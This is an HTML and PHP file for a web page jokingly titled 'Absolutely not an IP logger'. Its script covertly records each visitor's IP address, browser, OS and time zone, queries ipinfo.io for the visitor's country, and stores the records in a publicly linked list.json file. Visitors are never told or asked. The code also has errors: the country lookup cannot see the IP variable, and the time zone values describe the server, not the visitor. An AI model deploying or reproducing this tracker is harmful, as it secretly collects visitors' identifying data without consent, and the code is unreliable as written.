<!DOCTYPE html>
<html>
<head>
    <title>Absolutely not an IP logger</title>
    <link rel="stylesheet" href="./style.css">
    <link rel="icon" href="./content/">
</head>
<body>
    <nav id="nav">
            <a target=blank href="../list.html" class=""><button class="btn">List</button></a>
    </nav>
    <p id="secret">God doesn't exists</p>
</body>
</html>
<?php
if(!file_exists("./list.json")){
    file_put_contents("./list.json",'{"data":[]}');
}else if(!file_get_contents("./list.json") == '{"data":[]}' || file_get_contents("./list.json") == ""){
    file_put_contents("./list.json",'{"data":[]}');
}

$user_agent = $_SERVER['HTTP_USER_AGENT'];

$cur_data = json_decode(file_get_contents("./list.json"));

class Log {
    var $ip;
    var $ymd;
    var $hms;
    var $timeZone;
    var $country;
    var $utc;
    var $os;
    var $browser;
}
$new_data = new Log;

function getIp(){
    if (isset($_SERVER)){ 
		if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])){ 
			$realip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
		}else
			if (isset($_SERVER['HTTP_CLIENT_IP'])){ 
				$realip = $_SERVER['HTTP_CLIENT_IP']; 
			}else{ 
				$realip = $_SERVER['REMOTE_ADDR']; 
			} 
		}else{
		if (getenv("HTTP_X_FORWARDED_FOR")){ 
			$realip = getenv( "HTTP_X_FORWARDED_FOR"); 
		}else
			if (getenv("HTTP_CLIENT_IP")){ 
				$realip = getenv("HTTP_CLIENT_IP"); 
			}else{ 
				$realip = getenv("REMOTE_ADDR"); 
            } 
    }
    return $realip;
}
$new_data->ip = getIp();
function getCountry(){
    return file_get_contents("https://ipinfo.io/{$new_data->ip}/country");
}
function getBrowser(){
    global $user_agent;

    $browser = "Unknown Browser";

    $browser_array = array(
        '/msie/i'       =>  'Internet Explorer',
        '/firefox/i'    =>  'Firefox',
        '/Mozilla/i'	=>	'Firefox',
        '/Mozilla5.0/i'=>	'Firefox', // '/Mozilla/5.0/i'
        '/safari/i'     =>  'Safari',
        '/chrome/i'     =>  'Chrome',
        '/edge/i'       =>  'Edge',
        '/opera/i'      =>  'Opera',
        '/OPR/i'        =>  'Opera',
        '/netscape/i'   =>  'Netscape',
        '/maxthon/i'    =>  'Maxthon',
        '/konqueror/i'  =>  'Konqueror',
        '/Bot/i'		=>	'BOT Browser',
        '/Valve Steam GameOverlay/i'  =>  'Steam',
        '/mobile/i'     =>  'Handheld Browser'
        );

    foreach ($browser_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $browser = $value;
        }

    }
    return $browser;
}
function getTimeZone(){
    return str_replace("_", " ", date_default_timezone_get());
}
function getUtc(){
    $u = intval(date("H", time()));
    date_default_timezone_set("Europe/Berlin");
    $s = intval(date("H", time()));
    if($u == $s-13){
        $tz = "UTC-12";
    }elseif($u == $s-12){
        $tz = "UTC-11";
    }elseif($u == $s-11){
        $tz = "UTC-10";
    }elseif($u == $s-10){
        $tz = "UTC-9";
    }elseif($u == $s-9){
        $tz = "UTC-8";
    }elseif($u == $s-8){
        $tz = "UTC-7";
    }elseif($u == $s-7){
        $tz = "UTC-6";
    }elseif($u == $s-6){
        $tz = "UTC-5";
    }elseif($u == $s-5){
        $tz = "UTC-4";
    }elseif($u == $s-4){
        $tz = "UTC-3";
    }elseif($u == $s-3){
        $tz = "UTC-2";
    }elseif($u == $s-2){
        $tz = "UTC-1";
    }elseif($u == $s-1){
        $tz = "UTC 0";
    }elseif($u == $s){
        $tz = "UTC+1";
    }elseif($u == $s+1){
        $tz = "UTC+2";
    }elseif($u == $s+2){
        $tz = "UTC+3";
    }elseif($u == $s+3){
        $tz = "UTC+4";
    }elseif($u == $s+4){
        $tz = "UTC+5";
    }elseif($u == $s+5){
        $tz = "UTC+6";
    }elseif($u == $s+6){
        $tz = "UTC+7";
    }elseif($u == $s+7){
        $tz = "UTC+8";
    }elseif($u == $s+8){
        $tz = "UTC+9";
    }elseif($u == $s+9){
        $tz = "UTC+10";
    }elseif($u == $s+10){
        $tz = "UTC+11";
    }elseif($u == $s+11){
        $tz = "UTC+12";
    }else{
        $tz = "Unknown";
    }
    return $tz;
}
function getOs(){
    global $user_agent;

    $os_platform = "Unknown OS Platform";

    $os_array = array(
        '/windows nt 10/i'      =>  'Windows 10',
        '/windows nt 6.3/i'     =>  'Windows 8.1',
        '/windows nt 6.2/i'     =>  'Windows 8',
        '/windows nt 6.1/i'     =>  'Windows 7',
        '/windows nt 6.0/i'     =>  'Windows Vista',
        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
        '/windows nt 5.1/i'     =>  'Windows XP',
        '/windows xp/i'         =>  'Windows XP',
        '/windows nt 5.0/i'     =>  'Windows 2000',
        '/windows me/i'         =>  'Windows ME',
        '/win98/i'              =>  'Windows 98',
        '/win95/i'              =>  'Windows 95',
        '/win16/i'              =>  'Windows 3.11',
        '/macintosh|mac os x/i' =>  'Mac OS X',
        '/mac_powerpc/i'        =>  'Mac OS 9',
        '/linux/i'              =>  'Linux',
        '/kalilinux/i'          =>  'KaliLinux',
        '/ubuntu/i'             =>  'Ubuntu',
        '/iphone/i'             =>  'iOS',
        '/ipod/i'               =>  'iPod',
        '/ipad/i'               =>  'iPad OS',
        '/android/i'            =>  'Android',
        '/blackberry/i'         =>  'BlackBerry',
        '/webos/i'              =>  'Webos',
        '/Windows Phone/i'      =>  'Windows Phone'
    );

    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value;
        }
    }   
    return $os_platform;
}
$new_data->os = getOs();
$new_data->browser = getBrowser();
$new_data->timeZone = getTimeZone();
$new_data->utc = getUtc();
$new_data->getOs = getOs();
date_default_timezone_set("Europe/Berlin");
$new_data->ymd = date("Y-F-d", time());
$new_data->hms = date("H:i:s", time());
$new_data->country = getCountry();

array_push($cur_data->data, $new_data);
file_put_contents("./list.json", json_encode($cur_data));
